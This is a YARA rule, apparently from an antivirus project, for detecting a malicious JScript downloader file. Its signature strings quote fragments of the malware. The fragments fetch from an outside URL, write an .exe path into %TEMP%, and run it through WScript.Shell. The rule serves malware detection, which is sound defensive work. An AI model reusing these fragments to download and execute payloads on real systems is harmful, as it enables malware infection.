rule sig_20160328_677b0275be6b85827b9743a43758ecc8 {
  meta:
    description = "datamaliciousorder - file 20160328_677b0275be6b85827b9743a43758ecc8.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "fbca4432c2611bd27b59b4a68ec22006a66762407569d8a4dc3168203ececa3d"

  strings:
    $s1  = "function Wnpxjzafhg() {return Lqwdsp[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"IUxb9zUPXfamBFSF.exe\";};" fullword ascii
    $s2  = "Ruzuietfy[Ggaxbqnpyh](\"GET\", \"http://www.suansawanresort.com/n7eua\", false);" fullword ascii
    $s3  = "do {WScript[Rbeupsb](Qzemubu() * 11)} while (Ruzuietfy[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Lqwdsp = function Zorldlr() {return WScript[Nyyredvqi](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Spdnsiq(Ydqzembk, Nlituk){return Ydqzembk - Nlituk;};" fullword ascii
    $s6  = "function Ouhcs() {return ((Sgehor == true) && (Sgehor == Itwwpycs)) ? 1 : Exypqajpyy;};" fullword ascii
    $s7  = "function Ttrpqrexpf(Bfartm){Lqwdsp[\"Run\"](Bfartm, Exypqajpyy, Exypqajpyy);};" fullword ascii
    $s8  = "return Spdnsiq(Qjlqtcrnf, Bwteupw);" fullword ascii
    $s9  = "function Zcqeccuhta()" fullword ascii
    $s10 = "function Qzemubu(){return 22;};" fullword ascii
    $s11 = "var Dnwypcn = new this[\"Date\"]();" fullword ascii
    $s12 = "function Huenpwtgb(){return Hmlngj;};" fullword ascii
    $s13 = "var Sgehor = false;" fullword ascii
    $s14 = " while (Ppyguiatab){" fullword ascii
    $s15 = "var Zsfibccf = false;" fullword ascii
    $s16 = "function Xvollypmqf(){return Nyyredvqi;};" fullword ascii
    $s17 = "function Chajen(Yawis) {var Flcko = (1, 2, 3, 4, 5, Yawis); return Flcko;};" fullword ascii
    $s18 = "var Itwwpycs = false;" fullword ascii
    $s19 = "Itwwpycs = true; " fullword ascii
    $s20 = "Sgehor = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}